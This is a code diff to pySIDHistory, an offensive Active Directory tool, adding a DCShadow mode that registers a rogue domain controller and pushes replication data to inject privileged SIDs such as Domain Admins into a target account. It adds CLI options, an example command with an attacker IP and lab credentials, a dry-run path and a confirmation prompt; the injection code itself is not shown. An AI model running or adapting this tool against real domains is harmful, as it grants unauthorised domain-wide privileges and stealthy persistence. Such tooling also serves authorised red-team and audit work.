@@ -4,6 +4,7 @@ pySIDHistory v2 - Remote SID History Attack & Audit Tool
 
 v2 adds DSInternals-based injection for privileged SIDs (Domain Admins, etc.)
 that cannot be injected via DRSUAPI DRSAddSidHistory.
+v3 adds DCShadow replication-based injection (no NTDS downtime).
 
 Author: @felixbillieres
 License: MIT
@@ -26,7 +27,7 @@ BANNER = r"""
 | .__/ \__, |____/|___||____/|_| |_|_|___/\__\___/|_|   \__, |
 |_|    |___/                                             |___/
     Remote SID History Injection & Audit Tool  v2
-    DSInternals + DRSUAPI | github.com/felixbillieres
+    DSInternals + DRSUAPI + DCShadow | github.com/felixbillieres
                                       @felixbillieres
 """
 
@@ -61,6 +62,7 @@ def build_parser():
 MODES:
   Inject (DSInternals): Inject privileged SID via DSInternals (--target + --inject)
   Inject (DRSUAPI):     Inject SID via DRSUAPI (--target + --method drsuapi + --source-user)
+  Inject (DCShadow):    Inject SID via AD replication (--target + --method dcshadow + --attacker-ip)
   Query:                Query sIDHistory of an object (--query)
   Lookup:               Lookup SID of an object (--lookup)
   Audit:                Full domain sIDHistory audit (--audit)
@@ -79,6 +81,10 @@ EXAMPLES:
   # Inject arbitrary SID via DSInternals
   %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
       --target user1 --inject S-1-5-21-3522073385-2671856591-2684624930-512
+
+  # DCShadow injection (no NTDS downtime, requires root for port 135)
+  sudo %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
+      --target user1 --inject domain-admins --method dcshadow --attacker-ip 10.0.0.50
 
   # Cross-forest SID injection via DRSUAPI (legacy v1 method)
   %(prog)s -d DST.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 \\
@@ -130,10 +136,16 @@ EXAMPLES:
     inject_opts = parser.add_argument_group('Injection options (with --target)')
     inject_opts.add_argument('--inject', help='SID or preset to inject (e.g., domain-admins, S-1-5-21-...-512)')
     inject_opts.add_argument('--inject-domain', help='Foreign domain for preset resolution (e.g., LAB2.LOCAL)')
-    inject_opts.add_argument('--method', choices=['dsinternals', 'drsuapi'], default='dsinternals',
+    inject_opts.add_argument('--method', choices=['dsinternals', 'drsuapi', 'dcshadow'], default='dsinternals',
                              help='Injection method (default: dsinternals)')
     inject_opts.add_argument('--dsinternals-path', help='Path to DSInternals module on the DC (if no internet)')
     inject_opts.add_argument('--force', action='store_true', help='Skip confirmation warning before injection')
+
+    # ── DCShadow options (with --method dcshadow) ──
+    dcshadow = parser.add_argument_group('DCShadow options (with --method dcshadow)')
+    dcshadow.add_argument('--attacker-ip', help='Attacker IP reachable from the DC (ports 135 + 1337)')
+    dcshadow.add_argument('--computer-name', help='Rogue DC machine account name (auto-generated if omitted)')
+    dcshadow.add_argument('--computer-password', help='Rogue DC machine account password (auto-generated if omitted)')
 
     # ── DRSUAPI legacy options (with --method drsuapi) ──
     mods = parser.add_argument_group('DRSUAPI options (with --method drsuapi)')
@@ -207,6 +219,12 @@ def validate_arguments(args, auth_method: str, parser) -> bool:
                 parser.error("--target with --method drsuapi requires --source-user and --source-domain")
             if args.source_user and not args.source_domain:
                 parser.error("--source-user requires --source-domain (DRSAddSidHistory is cross-forest only)")
+
+        elif method == 'dcshadow':
+            if not args.inject:
+                parser.error("--target with --method dcshadow requires --inject")
+            if not args.attacker_ip:
+                parser.error("--target with --method dcshadow requires --attacker-ip")
 
     return True
 
@@ -338,6 +356,50 @@ def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
             src_creds_domain=src_creds_domain,
             src_creds_password=src_creds_password,
         )
+
+    elif method == 'dcshadow':
+        # DCShadow replication path
+        if dry_run:
+            sid = attacker.resolve_inject_sid(args.inject, args.inject_domain)
+            print(f"[DRY-RUN] Would inject SID {sid or args.inject} into {target}")
+            print(f"[DRY-RUN] Method: DCShadow (AD replication via rogue DC)")
+            print(f"[DRY-RUN] Attacker IP: {args.attacker_ip}")
+            return True
+
+        # Interactive warning before injection
+        if not args.force:
+            print("\n" + "=" * 60)
+            print("  WARNING: DCShadow SID History Injection")
+            print("=" * 60)
+            print(f"  Target:      {target}")
+            print(f"  Inject:      {args.inject}")
+            if args.inject_domain:
+                print(f"  Domain:      {args.inject_domain}")
+            print(f"  DC:          {args.dc_ip}")
+            print(f"  Attacker IP: {args.attacker_ip}")
+            print()
+            print("  This will register a rogue DC in AD,")
+            print("  push crafted replication data, then cleanup.")
+            print("  Requires root (port 135) and DA privileges.")
+            print("=" * 60)
+            try:
+                answer = input("\n  Proceed? [y/N] ").strip().lower()
+                if answer not in ('y', 'yes'):
+                    print("Aborted.")
+                    return False
+            except (EOFError, KeyboardInterrupt):
+                print("\nAborted.")
+                return False
+
+        success = attacker.inject_sid_history(
+            target, method='dcshadow',
+            inject_value=args.inject,
+            inject_domain=args.inject_domain,
+            attacker_ip=args.attacker_ip,
+            computer_name=getattr(args, 'computer_name', None),
+            computer_password=getattr(args, 'computer_password', None),
+        )
+
     else:
         logging.error(f"Unknown method: {method}")
         return False
